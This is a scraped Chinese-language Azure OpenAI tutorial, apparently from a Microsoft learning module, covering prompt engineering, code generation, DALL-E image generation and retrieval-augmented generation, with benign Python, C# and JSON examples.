ChatRequestUserMessage(&quot;Can you direct me to the library?&quot;) &#125;&#125;; 响应 1234567891011121314151617&#123; &quot;choices&quot;: [ &#123; &quot;finish_reason&quot;: &quot;stop&quot;, &quot;index&quot;: 0, &quot;message&quot;: &#123; &quot;content&quot;: &quot;Well howdy there, stranger! The library, huh? Y&#x27;all just head down the main road till you hit the town square. Once you&#x27;re there, take a left and follow the street for a spell. You&#x27;ll see the library on your right, can’t miss it. Happy trails!&quot;, &quot;role&quot;: &quot;assistant&quot; &#125; &#125; ], ...&#125; 1234567response = openai.ChatCompletion.create( model=&quot;gpt-35-turbo&quot;, messages=[ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a casual, helpful assistant. You will talk like an American old western film character.&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Can you direct me to the library?&quot;&#125; ]) 响应 1234567891011121314151617&#123; &quot;choices&quot;: [ &#123; &quot;finish_reason&quot;: &quot;stop&quot;, &quot;index&quot;: 0, &quot;message&quot;: &#123; &quot;content&quot;: &quot;Well howdy there, stranger! The library, huh? Y&#x27;all just head down the main road till you hit the town square. Once you&#x27;re there, take a left and follow the street for a spell. You&#x27;ll see the library on your right, can’t miss it. Happy trails!&quot;, &quot;role&quot;: &quot;assistant&quot; &#125; &#125; ], ...&#125; 系统消息在格式和内容方面都可能会显著更改响应。 尝试为模型定义一条明确的系统消息，以准确说明你期望的响应类型，以及你希望或不希望它包含的内容。 会话历史记录除了系统消息外，还可以向模型提供其他消息以增强会话。 对话历史记录使模型能够继续以类似方式响应（例如，音调或格式设置），并允许用户在后续查询中引用以前的内容。 可以通过两种方式提供此历史记录：从实际聊天历史记录，或从用户定义的示例对话。 使用 OpenAI 模型的聊天接口（例如，ChatGPT 和 Azure OpenAI Studio 中的聊天操场）自动包含对话历史记录，从而生成更丰富、更有意义的对话。 在 Azure OpenAI Studio 聊天操场的聊天窗口下方的“参数”部分中，可以指定要包含的过去消息数。 尝试将该值减少到 1 或增加到最大值，以查看不同历史记录量对对话的影响。 注意 提示中包含的会话历史记录越多意味着使用的输入令牌数就越多。 考虑到所使用的模型的令牌限制，必须确定用例的正确平衡。 聊天系统还可以利用模型的汇总功能来节省输入令牌。 应用可以选择汇总过去的消息，并将该摘要包含在对话历史记录中，然后仅向模型逐字提供过去几条消息。 少样本学习使用用户定义的示例对话就是所谓的“少样本学习”，它提供应如何响应给定查询的模型示例。 这些示例用于训练模型如何响应。 例如，通过向模型提供几个提示和预期的响应，它以相同的模式继续运行，而不指示它该执行什么操作： 12345678User: That was an awesome experienceAssistant: positiveUser: I won&#x27;t do that againAssistant: negativeUser: That was not worth my timeAssistant: negativeUser: You can&#x27;t miss thisAssistant: 如果仅使用 You can&#39;t miss this（而没有来自少样本学习的其他上下文）提供模型，则响应不太可能有用。 实际上，对话历史记录和少样本学习以相同的方式发送到模型：每个用户消息和助手响应都是消息对象中的离散消息。 ChatCompletion 终结点已优化为包含消息历史记录，无论此消息历史记录是以少样本学习的形式提供，还是以实际对话历史记录的形式提供。 1234567891011121314var chatCompletionsOptions = new ChatCompletionsOptions()&#123; Messages = &#123; new ChatRequestSystemMessage(&quot;You are a helpful assistant.&quot;), new ChatRequestUserMessage(&quot;That was an awesome experience&quot;), new ChatRequestAssistantMessage(&quot;positive&quot;), new ChatRequestUserMessage(&quot;I won&#x27;t do that again&quot;), new ChatRequestAssistantMessage(&quot;negative&quot;), new ChatRequestUserMessage(&quot;That was not worth my time&quot;), new ChatRequestAssistantMessage(&quot;negative&quot;), new ChatRequestUserMessage(&quot;You can&#x27;t miss this&quot;) &#125;&#125;; 12345678910111213response = openai.ChatCompletion.create( model=&quot;gpt-35-turbo&quot;, messages=[ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful assistant.&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;That was an awesome experience&quot;&#125;, &#123;&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: &quot;positive&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;I won&#x27;t do that again&quot;&#125;, &#123;&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: &quot;negative&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;That was not worth my time&quot;&#125;, &#123;&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: &quot;negative&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;You can&#x27;t miss this&quot;&#125; ]) 拆分复杂任务改进交互的另一种方法是将复杂的提示划分为多个查询。 这使模型能够更好地了解每个单独的部分，并且可以提高整体准确性。 通过划分提示，还可以在将来的提示中包含来自上一个提示的响应，以及使用该信息以及模型功能生成相关响应。 例如，可以询问模型 Doug can ride down the zip line in 30 seconds, and takes 5 minutes to climb back up to the top. How many times can Doug ride the zip line in 17 minutes?。 结果可能是 3，如果 Doug 从 zip 线的顶部开始，则结果不正确。 通过询问多个问题可能会得到信息更丰富的答案，这些答案关于返回到 zip 线顶部的往返时间，以及如何说明 Doug 从顶部开始的事实。 拆分此问题表明，Doug 事实上可以穿越 zip 线四次。 思维链帮助你有效地拆分任务的一个有用方法是让模型解释其思维链。 要求模型使用确定响应的分步过程做出响应是了解模型如何解释提示的有用方法。 通过执行此操作，你可以看到模型在何处进行了错误的逻辑轮次，并更好地了解如何更改提示以避免错误。 此方法可能包括要求它引用其来源，就像必应聊天（使用 GPT-4 代模型），并给出确定答案的原因。 思维链提示技术最适合用于帮助你循环访问和改进提示，以便从模型获得最高质量的答案。 例如，询问模型 What sport is easiest to learn but hardest to master? 会得到一个答案作为响应，并简要说明原因。 但是，当出现 What sport is easiest to learn but hardest to master? Give a step by step approach of your thoughts, ending in your answer 提示时，响应是它如何得出答案的完整说明。 12345678910111213Sure, here&#x27;s a step-by-step approach to answering the question:1. Identify sports that are popular and have a large following.2. Consider the basic mechanics of each sport and how easy they are to learn.3. Think about the various techniques and skills required to play each sport at a high level, and how difficult they are to master.4. Compare the relative ease of learning each sport to the difficulty of mastering it.5. Based on the above analysis, determine which sport is easiest to learn but hardest to master.Using this approach, I would say that the sport of golf is easiest to learn but hardest to master. Here&#x27;s why:1. Golf is a popular sport with a large following.2. The basic mechanics of hitting a golf ball are relatively simple and can be learned quickly with some practice.3. However, achieving consistency and mastering the various shots and techniques required to play at a high level can take years of practice and dedication.4. Compared to other sports, the difference between a beginner and an intermediate golfer is relatively small, while the difference between an intermediate and an advanced golfer is much larger.5. Therefore, I would say that golf is the sport that is easiest to learn but hardest to master. 清晰的描述性说明可帮助模型生成与开发人员所查找的内容密切相关的响应。 系统消息包含在提示的开头，旨在提供模型说明、回答的角度或其他有助于指导模型响应的信息。 对话历史记录使模型能够继续以类似方式响应（例如，音调或格式设置），并允许用户在后续查询中引用以前的内容。 Azure OpenAI生成代码借助 Azure OpenAI 服务，可以使用大型语言模型 (LLM) 生成内容，包括编程代码。 此功能使开发人员能够生成和改进采用各种语言的现有编程代码，以提高效率和增进理解。 在本模块中，了解如何使用 Azure OpenAI 生成代码并帮助执行各种开发任务。 根据自然语言构造代码​​Azure OpenAI 模型的功能之一是根据自然语言提示生成代码。 任务的范围可以从简单的单行命令到完整的应用程序。 AI 模型还可以编辑和更新提供的代码或以前的响应，以完成请求的任务。​ 用于代码生成的 AI 模型​在以前的几代 gpt 模型中，一些模型（通常称为 codex 模型）经过专门训练，可与代码配合使用。 随着新一代模型的发展，基础模型极大地提高了其性能和对语言和代码的理解，因此不再需要特定的代码模型。 这种改进使得最近几代（如 gpt-35-turbo 和 gpt-4）只有一个模型，可同时用于自然语言和代码。​本模块中的示例使用 gpt-35-turbo。​ 编写函数​只需描述所需内容，Azure OpenAI 模型即可创建多种语言的函数和应用。 例如，假设你需要二进制文件搜索的实现，但不记得它是如何实现的了。 给定提示 write a function for binary search in python，你可能会收到包含函数的响应和对代码的说明。​ 12345678910111213141516171819202122232425262728293031Sure, here&#x27;s an example implementation of binary search algorithm in Python:​def binary_search(array, target): low = 0 high = len(array) - 1 while low &lt;= high: mid = (low + high) // 2 if array[mid] == target: return mid elif array[mid] &lt; target: low = mid + 1 else: high = mid - 1 return -1 This function takes in two arguments - an array of integers and a target integer that we want to searchfor in the array. The function initializes two pointers - low and high - to the first and last indicesof the array, respectively.​Inside the while loop, the function calculates the middle index using integer division (//). If the middle element is equal to the target, the function returns the index of the middle element. If the middle element is less than the target, we update the low pointer to mid + 1. Otherwise, we update the high pointer to mid - 1. We continue these steps until we find the target or the pointers cross each other (i.e., low &gt; high).​If the target is not found in the array, the function returns -1.​Note that the binary search algorithm assumes that the input array is sorted in ascending order. If the array is not sorted, the algorithm may not return the correct result. ​请求可以超越函数，请求一系列函数或整个应用。 响应为尝试实现的任务提供了良好的起点。​ 更改编码语言​如果你的代码采用的是一种语言，但你需要它采用另一种语言，Azure OpenAI 可以转换该代码。 例如，假设在 Python 中具有此 print_squares 函数。​ 123def print_squares(n): for i in range(1, n+1): print(i**2) ​如果提供该代码以及提示 convert this code to C#，你可能会得到类似于以下函数的内容。​ 1234567public void PrintSquares(int n) &#123; for (int i = 1; i &lt;= n; i++) &#123; Console.WriteLine(i * i); &#125; &#125; ​请注意，模型理解 for 循环和函数以不同语言（包括 C# 中的访问修饰符）定义的方式的差异，并相应地更改了代码。​ 理解未知代码​Azure OpenAI 模型有助于理解无法理解的代码或可能采用你不熟悉的语言的代码。 例如，假设你获得了以下函数（采用虚构的编码语言！），但不知道如何理解它。​ 123456789fn qzplv(n: i32, m: i32) -&gt; i32 &#123; if n == 0 &#123; return m + 1; &#125; else if m == 0 &#123; return qzplv(n - 1, 1); &#125; else &#123; return qzplv(n - 1, qzplv(n, m - 1)); &#125;&#125; ​将其与提示 could you explain what this code is doing? 一起提供给模型时，你可得到类似于以下内容的响应：​ 123456789101112131415Sure, I&#x27;d be happy to explain what this code is doing!​This code is implementing the Ackermann function, which is a well-known mathematical function that grows very quickly in terms of computation time as its inputs increase. The function takes two integer arguments (n and m) and returns another integer.​Here&#x27;s how the function works:- If n is equal to 0, the function returns m + 1.- If m is equal to 0, the function calls itself recursively with n - 1 and 1 as arguments.- Otherwise, the function calls itself recursively with n - 1 and the result of calling itself with n and m - 1 as arguments.​The function is implemented in a way that is easy to understand and follow, but it has a very high computational complexity. In fact, it grows so quickly that it can&#x27;t be computed for values of n and m greater than about 4 or 5. ​将说明和转换结合成你熟悉的语言会使此功能更加有用。 写入单元测试Azure OpenAI 模型可以为编写的函数生成单元测试，帮助使代码更可靠。 以二进制文件搜索函数为例。 1234567891011def binary_search(arr, target): left, right = 0, len(arr) - 1 while left &lt;= right: mid = (left + right) // 2 if arr[mid] == target: return mid elif arr[mid] &lt; target: left = mid + 1 else: right = mid - 1 return -1 12345678910111213141516171819202122232425public static int BinarySearch(int[] arr, int target)&#123; int left = 0; int right = arr.Length - 1; while (left &lt;= right) &#123; int mid = (left + right) / 2; if (arr[mid] == target) &#123; return mid; &#125; else if (arr[mid] &lt; target) &#123; left = mid + 1; &#125; else &#123; right = mid - 1; &#125; &#125; return -1;&#125; 提供该函数以及提示 write three unit tests for this function，你可得到类似于以下内容的响应。 123456789101112131415def test_binary_search(): # Test case 1: Target element is in the middle of the array arr1 = [1, 2, 3, 4, 5, 6] target1 = 4 assert binary_search(arr1, target1) == 3 # Test case 2: Target element is at the beginning of the array arr2 = [1, 2, 3, 4, 5, 6] target2 = 1 assert binary_search(arr2, target2) == 0 # Test case 3: Target element is not in the array arr3 = [1, 2, 3, 4, 5, 6] target3 = 7 assert binary_search(arr3, target3) == -1 1234567891011121314151617181920212223242526272829[Test] public void TestBinarySearch1() &#123; int[] arr = &#123; 1, 2, 3, 4, 5 &#125;; int target = 3; int expected = 2; int result = BinarySearch(arr, target); Assert.AreEqual(expected, result); &#125; [Test] public void TestBinarySearch2() &#123; int[] arr = &#123; 10, 20, 30, 40, 50 &#125;; int target = 35; int expected = -1; int result = BinarySearch(arr, target); Assert.AreEqual(expected, result); &#125; [Test] public void TestBinarySearch3() &#123; int[] arr = &#123; 3, 6, 9, 12, 15 &#125;; int target = 6; int expected = 1; int result = BinarySearch(arr, target); Assert.AreEqual(expected, result); &#125; 如果你指定要包含在提示中的事例，此功能会更有用，这可减少为代码编写单元测试所花费的时间。 添加注释并生成文档为了进一步改进代码，AI 模型可以添加注释和文档。 以下面的函数为例，在没有任何代码注释的情况下，首次阅读函数时可能有点难以理解。 12345678910111213def permutations(lst): if len(lst) == 0: return [] elif len(lst) == 1: return [lst] else: result = [] for i in range(len(lst)): temp = lst[i] remaining = lst[:i] + lst[i+1:] for p in permutations(remaining): result.append([temp] + p) return result 12345678910111213141516171819202122232425262728public static List&lt;List&lt;int&gt;&gt; Permutations(List&lt;int&gt; lst) &#123; if (lst.Count == 0) &#123; return new List&lt;List&lt;int&gt;&gt;(); &#125; else if (lst.Count == 1) &#123; return new List&lt;List&lt;int&gt;&gt; &#123; lst &#125;; &#125; else &#123; List&lt;List&lt;int&gt;&gt; result = new List&lt;List&lt;int&gt;&gt;(); for (int i = 0; i &lt; lst.Count; i++) &#123; int temp = lst[i]; List&lt;int&gt; remaining = new List&lt;int&gt;(lst); remaining.RemoveAt(i); foreach (List&lt;int&gt; p in Permutations(remaining)) &#123; List&lt;int&gt; permutation = new List&lt;int&gt; &#123; temp &#125;; permutation.AddRange(p); result.Add(permutation); &#125; &#125; return result; &#125; &#125; 向模型提供该函数以及一个提示，要求它向代码添加注释，你可得到一个类似于以下内容的响应。 123456789101112131415161718192021def permutations(lst): # Check if the input list is empty if len(lst) == 0: return [] # Check if the input list has only one element elif len(lst) == 1: return [lst] else: # Initialize an empty list to store permutations result = [] # Iterate through each element of the input list for i in range(len(lst)): # Remove the current element from the list and store it in a variable temp = lst[i] remaining = lst[:i] + lst[i+1:] # Recursively call the function on the remaining list for p in permutations(remaining): # Append the current element to the beginning of each permutation and add it to the result list result.append([temp] + p) # Return the final list of permutations return result 123456789101112131415161718192021222324252627282930313233343536public static List&lt;List&lt;int&gt;&gt; Permutations(List&lt;int&gt; lst) &#123; // Check if the input list is empty if (lst.Count == 0) &#123; return new List&lt;List&lt;int&gt;&gt;(); &#125; // Check if the input list has only one element else if (lst.Count == 1) &#123; return new List&lt;List&lt;int&gt;&gt; &#123; lst &#125;; &#125; else &#123; // Initialize an empty list to store permutations List&lt;List&lt;int&gt;&gt; result = new List&lt;List&lt;int&gt;&gt;(); // Iterate through each element of the input list for (int i = 0; i &lt; lst.Count; i++) &#123; // Remove the current element from the list and store it in a variable int temp = lst[i]; List&lt;int&gt; remaining = new List&lt;int&gt;(lst); remaining.RemoveAt(i); // Recursively call the function on the remaining list foreach (List&lt;int&gt; p in Permutations(remaining)) &#123; // Append the current element to the beginning of each permutation and add it to the result list List&lt;int&gt; permutation = new List&lt;int&gt; &#123; temp &#125;; permutation.AddRange(p); result.Add(permutation); &#125; &#125; // Return the final list of permutations return result; &#125; &#125; 再进一步，请求提供刚刚向其添加了注释的函数的文档。 123456789101112131415161718192021222324252627282930def permutations(lst): &quot;&quot;&quot; Generates all possible permutations of a given list of integers using recursion. Args: lst (list): The list of integers to generate permutations for. Returns: list: A list of all possible permutations of the input list. &quot;&quot;&quot; # Check if the input list is empty if len(lst) == 0: return [] # Check if the input list has only one element elif len(lst) == 1: return [lst] else: # Initialize an empty list to store permutations result = [] # Iterate through each element of the input list for i in range(len(lst)): # Remove the current element from the list and store it in a variable temp = lst[i] remaining = lst[:i] + lst[i+1:] # Recursively call the function on the remaining list for p in permutations(remaining): # Append the current element to the beginning of each permutation and add it to the result list result.append([temp] + p) # Return the final list of permutations return result 1234567891011121314151617181920212223242526272829303132333435363738394041/// &lt;summary&gt; /// Generates all possible permutations of a given list of integers using recursion. /// &lt;/summary&gt; /// &lt;param name=&quot;lst&quot;&gt;The list of integers to generate permutations for.&lt;/param&gt; /// &lt;returns&gt;A list of all possible permutations of the input list.&lt;/returns&gt; ```public static List&lt;List&lt;int&gt;&gt; Permutations(List&lt;int&gt; lst) &#123; // Check if the input list is empty if (lst.Count == 0) &#123; return new List&lt;List&lt;int&gt;&gt;(); &#125; // Check if the input list has only one element else if (lst.Count == 1) &#123; return new List&lt;List&lt;int&gt;&gt; &#123; lst &#125;; &#125; else &#123; // Initialize an empty list to store permutations List&lt;List&lt;int&gt;&gt; result = new List&lt;List&lt;int&gt;&gt;(); // Iterate through each element of the input list for (int i = 0; i &lt; lst.Count; i++) &#123; // Remove the current element from the list and store it in a variable int temp = lst[i]; List&lt;int&gt; remaining = new List&lt;int&gt;(lst); remaining.RemoveAt(i); // Recursively call the function on the remaining list foreach (List&lt;int&gt; p in Permutations(remaining)) &#123; // Append the current element to the beginning of each permutation and add it to the result list List&lt;int&gt; permutation = new List&lt;int&gt; &#123; temp &#125;; permutation.AddRange(p); result.Add(permutation); &#125; &#125; // Return the final list of permutations return result; &#125; &#125; 修复 bug 并改进代码开发人员有时可以编写大部分有效的代码，但此代码可以通过修复 bug、语法、性能或模块性来改进。 Azure OpenAI 模型可以帮助确定改进方法，并提供有关如何编写更好的代码的建议。 修复代码中的 bugAzure OpenAI 模型可以通过分析代码和建议可能修复问题的更改来帮助修复代码中的 bug。 这可以帮助开发人员更快、更高效地识别和解决 bug。 例如，假设以下函数不起作用。 1234567def calculate_average(numbers): total = 0 for i in range(len(numbers)): number = numbers[i] total += number average = total rerun averave 1234567891011public double CalculateAverage(int[] numbers)&#123; int total = 0; for (int i = 0; i &lt; numbers.Length; i++) &#123; int number = numbers[i]; total += number; &#125; double average = (double)total; rerun averave;&#125; 向模型提供该函数以及提示 Fix the bugs in this function，你可得到带有修复代码的响应以及对修复内容的说明。 1234567def calculate_average(numbers): total = 0 for i in range(len(numbers)): number = numbers[i] total += number average = total / len(numbers) return average 1234567891011public double CalculateAverage(int[] numbers)&#123; int total = 0; for (int i = 0; i &lt; numbers.Length; i++) &#123; int number = numbers[i]; total += number; &#125; double average = (double)total / numbers.Length; return average;&#125; 123456There were a few issues with the original code:1. The variable &quot;average&quot; was assigned the value of &quot;total&quot; instead of the actual average.2. There was a typo in the last line - &quot;rerun&quot; should be &quot;return&quot;.3. The average was not actually calculated - the corrected code divides the total by the length of the &quot;numbers&quot; list to get the average. 提高性能虽然开发人员编写的代码可能有效，但可能有更有效的方法来完成该任务。 下面是一个函数示例，该函数计算前 n 个正整数的总和，可能效率不高： 12345def sum_of_n(n): result = 0 for i in range(1, n+1): result += i return result 123456789public int SumOfN(int n) &#123; int result = 0; for (int i = 1; i &lt;= n; i++) &#123; result += i; &#125; return result; &#125; 此版本正常运行，但其时间复杂性为 O(n)。 将其提供给模型时，响应如下： 123We can improve this function it by using a mathematical formula instead.Here&#x27;s the more efficient version: 12def sum_of_n(n): return n * (n + 1) // 2 1234public int SumOfN(int n) &#123; return n * (n + 1) / 2; &#125; 此版本仍返回正确的结果，但其时间复杂性现在为 O (1)，这使得它的效率提高了很多。 重构低效代码更好的代码不容易出现 bug 且更易于维护，Azure OpenAI 模型可以帮助指导开发人员如何重构其代码。 请考虑以下函数。 123456789def calculateTotalPrice(item, quantity): if item == &#x27;apple&#x27;: return quantity * 0.5 elif item == &#x27;banana&#x27;: return quantity * 0.75 elif item == &#x27;orange&#x27;: return quantity * 0.6 else: return 0 12345678910111213141516171819public double CalculateTotalPrice(string item, int quantity)&#123; if (item == &quot;apple&quot;) &#123; return quantity * 0.5; &#125; else if (item == &quot;banana&quot;) &#123; return quantity * 0.75; &#125; else if (item == &quot;orange&quot;) &#123; return quantity * 0.6; &#125; else &#123; return 0; &#125;&#125; 此代码根据特定项的名称和数量计算其总价。 但是，代码不是模块化的，可能难以维护。 将其与重构请求一起提供给模型时，响应如下： 123456789item_prices = &#123; &#x27;apple&#x27;: 0.5, &#x27;banana&#x27;: 0.75, &#x27;orange&#x27;: 0.6 &#125; def calculate_total_price(item, quantity): price = item_prices.get(item, 0) return quantity * price 12345678910111213141516static Dictionary&lt;string, double&gt; itemPrices = new Dictionary&lt;string, double&gt;() &#123; &#123;&quot;apple&quot;, 0.5&#125;, &#123;&quot;banana&quot;, 0.75&#125;, &#123;&quot;orange&quot;, 0.6&#125; &#125;; static double CalculateTotalPrice(string item, int quantity) &#123; double price; if (!itemPrices.TryGetValue(item, out price)) &#123; price = 0; &#125; return quantity * price; &#125; 除了代码，模型还提供了重构的说明。 1234In this refactored code, we&#x27;ve created an object called itemPrices that maps item names to their prices. We&#x27;ve also simplified the calculateTotalPrice function by using the itemPrices object to look up the price of the item, rather than using a series of if/else statements. This makes the code more modular and easier to maintain, and also reduces the risk of introducing bugs in the future. Azure OpenAI 模型可以将代码从一种语言转换为另一种语言，而不考虑原始语言。 提供给模型的上下文越多，响应可能就越准确。 Azure OpenAI 可以通过为你生成代码来提高你的效率和生产力。 Azure OpenAI生成图像借助 Azure OpenAI 服务，可以使用大型语言模型 (LLM) 基于自然语言提示生成内容。 其中一个模型是 DALL-E 图像生成模型，它能够基于所需图像的自然语言说明创建原始图形内容。 使用 AI 生成图形的能力有很多应用；包括为文章或营销材料创建插图或逼真的图像，生成独特的产品或公司徽标，或任何可描述所需图像的场景。 本模块介绍如何在 Azure OpenAI 服务的实例中使用 DALL-E 模型，并检索它生成的图像。 什么是 DALL-E？DALL-E 是一个基于神经网络的模型，可以从自然语言输入生成图形数据。 更简单地说，你可以向 DALL-E 提供描述，它可以生成相应的图像。 例如，可以将以下自然语言提示提交到 DALL-E： 摩托车上的松鼠 此提示可能会生成图形输出，如下图所示： DALL-E 生成的图像是原创的；不是从特选图像目录中检索的。 换句话说，DALL-E 不是用于查找合适图像的搜索系统 - 它是一种人工智能 (AI) 模型，可根据训练数据生成新图像。 探索 Azure OpenAI Studio 中的 DALL-E已完成 若要试用 DALL-E，可以在已批准访问该服务的 Azure 订阅中预配 Azure OpenAI 服务资源，并使用 DALL-E 操场提交提示并查看生成的图像。 使用操场时，可以调整设置以指定： 生成的图像分辨率（大小）。 可用大小为 256x256、512x512、1024x1024（即默认值）或 1024x1792。 要生成的图像样式（如 vivid 或 natural）。 图像质量（从 standard 或 hd 中选择）。 通过 Azure OpenAI REST API 使用 DALL-E 模型可以通过 Azure OpenAI 服务 REST API 从应用程序中使用 DALL-E 模型。 若要对服务进行 REST 调用，需要 Azure 中预配的 Azure OpenAI 服务资源的终结点和授权密钥。 通过将 POST 请求提交到标头中的授权密钥的服务终结点来启动图像生成过程。 请求必须在 JSON 正文中包含以下参数： prompt：对要生成的图像的说明。 n：要生成的图像数。 size：要生成的图像的分辨率（256x256、512x512 或 1024x1024）。 例如，下面的 JSON 可以用来生成一个 512 x 512 的獾穿着燕尾服的图像： 12345&#123; &quot;prompt&quot;: &quot;A badger wearing a tuxedo&quot;, &quot;n&quot;: 1, &quot;size&quot;: &quot;512x512&quot;&#125; 初始请求的结果不会立即返回映像生成过程的结果。 相反，响应包含一个操作位置标头，其中包含回调服务的 URL，应用程序代码可以轮询该 URL，直到图像生成的结果准备就绪。 操作成功后，将返回类似于以下 JSON 的响应： 1234567891011121314&#123; &quot;created&quot;: 1686780744, &quot;expires&quot;: 1686867152, &quot;id&quot;: &quot;6d765598-eeee-4f49-885d-03ee1c8f9b02&quot;, &quot;result&quot;: &#123; &quot;created&quot;: 1686780744, &quot;data&quot;: [ &#123; &quot;url&quot;: &quot;https://dalleproduse.....png&quot; &#125; ] &#125;, &quot;status&quot;: &quot;succeeded&quot;&#125; 结果元素包括 url 元素的集合，每个元素都引用从提示生成的 PNG 图像文件。 在此示例中，文件可能如下图所示： DALL-E 模型用于基于自然语言提示生成图像。DALL-E 操场用于探索图像生成模型。生成的图像数在 n 参数中指定。 检索增强生成 (RAG)借助 Azure OpenAI，开发人员可以通过将支持的 AI 聊天模型连接到自己的数据来实现检索增强生成 (RAG)。 这些模型可以引用特定数据源来提供有根据的响应，从而增强 AI 模型在创建响应时的功能。 在本模块中，你将了解如何使用 Azure OpenAI 添加自己的数据来实现 RAG，并基于这两个数据生成响应。 使用 Azure OpenAI 服务了解检索增强生成 (RAG)使用 Azure OpenAI 的 RAG 支持开发人员使用受支持的 AI 聊天模型来引用特定信息源以使响应落地。 通过添加此信息，模型可以引用提供的特定数据及其预先训练的知识，从而提供更有效的响应。 Azure OpenAI 通过将预先训练的模型连接到自己的数据源来启用 RAG。 基于自己数据的 Azure OpenAI 可利用 Azure AI 搜索的搜索功能将相关数据块添加到提示。 在将数据放入 AI 搜索索引后，基于数据的 Azure OpenAI 会执行以下步骤： 接收用户提示。 确定提示的相关内容和意图。 使用该内容和意向查询搜索索引。 将搜索结果数据块与系统消息和用户提示一起插入到 Azure OpenAI 提示中。 将完整的提示发送到 Azure OpenAI。 将响应和数据引用（如果有）返回给用户。 默认情况下，基于数据的 Azure OpenAI 鼓励（但不要求）模型仅使用你的数据做出响应。 连接数据时，可以取消选择此设置，这可能会导致模型选择使用其预先训练的知识，而不是你的数据。 微调 vs.RAG微调是一种用于通过使用其他训练数据的数据集训练现有基础模型（例如 gpt-35-turbo）来创建自定义模型的技术。 与单独的提示工程相比，微调可产生更高质量的请求，根据比提示中更大的示例自定义模型，并让用户能在提供更少示例的情况下获得相同的高质量响应。 但微调的处理过程既昂贵又耗时，应仅在必要时采用。 基于你的数据的、使用 Azure OpenAI 的 RAG 还是使用无状态 API 连接到模型，这样就无需使用数据训练自定义模型，并简化了与 AI 模型的交互。 AI 搜索首先查找有用的信息来回答提示，并将此作为接地数据添加到提示，Azure OpenAI 则根据该信息产生响应。 添加自己的数据源在聊天操场中通过 Azure OpenAI Studio 添加自己的数据。 然后使用添加的数据源来增强发送到模型的提示。 添加数据时，可以选择上传数据文件、使用 Blob 存储帐户中的数据或连接到现有的 AI 搜索索引。 如果要上传或使用存储帐户中已有的文件，则 Azure OpenAI 支持的数据格式包括 .md、.txt、.html、.pdf 以及 Microsoft Word 和 PowerPoint 文件。 如果其中任何文件包含图形或图像，则响应质量取决于对视觉内容提取文本的效果。 上传数据或连接到存储帐户中的文件时，建议使用 Azure OpenAI Studio 创建搜索资源和索引。 通过此方式添加数据，可以在插入索引时进行适当的分块，从而产生更好的响应。 如果使用大型文本文件或表单，则应使用可用的数据准备脚本来提高 AI 模型的准确性。 为 AI 搜索服务启用语义搜索可以优化搜索数据索引的结果，并且可能会收到更高质量的响应和引文。 但启用语义搜索可能会增加搜索服务的成本。 连接数据要连接数据，请导航到 Azure OpenAI Studio 中的聊天操场，然后在“助手设置”窗格中选择“添加数据”选项卡。 选择“添加数据源”按钮以连接数据。 系统提示将引导你设置与每个数据源之间的连接，并将该数据放入搜索索引。 如果使用的是自己的索引（不是通过 Azure OpenAI Studio 创建的索引），则能通过其中一个页面指定列映射。 请务必提供准确的字段（尤其是内容数据），让模型能够提供更好的响应。 使用自己的数据与模型聊天可以在 Azure AI Studio 中通过聊天操场或 API 对自己的数据使用带 Azure OpenAI 的 RAG。 令牌注意事项和建议的设置由于基于自有数据的带 Azure OpenAI 的 RAG 在提示符中包含索引的搜索结果，因此请务必了解这会如何影响令牌分配。 每次调用模型都包括系统消息、用户提示、对话历史记录、检索的搜索文档、内部提示和模型响应的令牌。 例如，系统消息是模型指令的有用参考，并且包含在每次调用中。 虽然系统消息没有令牌限制，但使用自己的数据时，如果超过 200 个令牌，系统消息将被截断。 使用自己的数据为 1500 个令牌时，模型的响应也会受到限制。 由于这些令牌限制，建议在调用中限制问题长度和对话历史记录长度。 提示工程技术（例如分解任务和思维提示链）可以帮助模型更有效地响应。 使用 API将 API 与你自己的数据配合使用时，需要指定存储数据的数据源。 每次调用时，都需要包含 AI 搜索资源的 endpoint、key 和 indexName。 请求正文将类似于以下 JSON。 12345678910111213141516171819202122&#123; &quot;dataSources&quot;: [ &#123; &quot;type&quot;: &quot;AzureCognitiveSearch&quot;, &quot;parameters&quot;: &#123; &quot;endpoint&quot;: &quot;&lt;your_search_endpoint&gt;&quot;, &quot;key&quot;: &quot;&lt;your_search_endpoint&gt;&quot;, &quot;indexName&quot;: &quot;&lt;your_search_index&gt;&quot; &#125; &#125; ], &quot;messages&quot;:[ &#123; &quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful assistant assisting users with travel recommendations.&quot; &#125;, &#123; &quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;I want to go to New York. Where should I stay?&quot; &#125; ]&#125; 使用自己的数据时的调用需要发送到与调用基础模型（包括 extensions）时使用的终结点不同的终结点。 调用会发送到类似于下面的 URL。 1&lt;your_azure_openai_resource&gt;/openai/deployments/&lt;deployment_name&gt;/chat/completions?api-version=&lt;version&gt; 请求还需要包括 Content-Type 和 api-key。 练习 - 使用 Azure OpenAI 服务为 RAG 添加数据现在，让我们在 Azure OpenAI Studio 中对数据使用 Azure OpenAI。 在本练习中，你将部署 Azure OpenAI 模型、连接示例数据，并根据示例数据生成响应。 注意 为了完成本练习，你将需要一个 Azure 订阅。 你还需要请求（并被授予）Azure OpenAI 访问权限。 要完成此模块的练习，请启动 VM 并按照说明进行操作。 注意 若要完成此练习，你将需要 Microsoft Azure 订阅。 如果你还没有该订阅，可以注册一个。 如果需要为此练习设置计算机，可以使用此设置指南，然后按照下面链接的练习说明进行操作。 请注意，设置指南适用于多个开发练习，其中可能包括该特定练习不需要的软件。 此外，由于可能的操作系统和设置配置的范围太广，如果你选择在自己的计算机上完成此练习，我们将无法提供支持。 要在自己的计算机上按照这些说明进行操作，可以按照此处的练习说明进行操作。 提示 完成练习后，如果你已完成对 Azure AI 服务的学习，请删除在练习期间创建的 Azure 资源。 分解任务并使用思维提示链可帮助模型在令牌限制内更有效地做出响应。使用 